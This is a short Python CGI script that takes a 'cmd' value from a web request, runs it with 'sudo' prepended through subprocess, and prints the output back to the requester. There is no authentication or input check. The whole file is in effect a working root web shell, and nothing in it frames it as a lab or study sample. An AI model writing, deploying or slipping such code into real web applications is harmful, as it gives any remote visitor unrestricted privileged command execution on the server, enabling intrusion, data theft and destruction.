#!/usr/bin/env python3

import cgi
import subprocess as sp

print("Content-type: text/plain")
print()

def run_command(command):
    try:
        output = sp.getoutput("sudo " + command)
        return output
    except Exception as e:
        return str(e)

try:
    form = cgi.FieldStorage()
    command = form.getvalue("cmd")

    if command:
        output = run_command(command)
        print(output)
    else:
        print("No command provided.")
except Exception as e:
    print(f"Error: {e}")
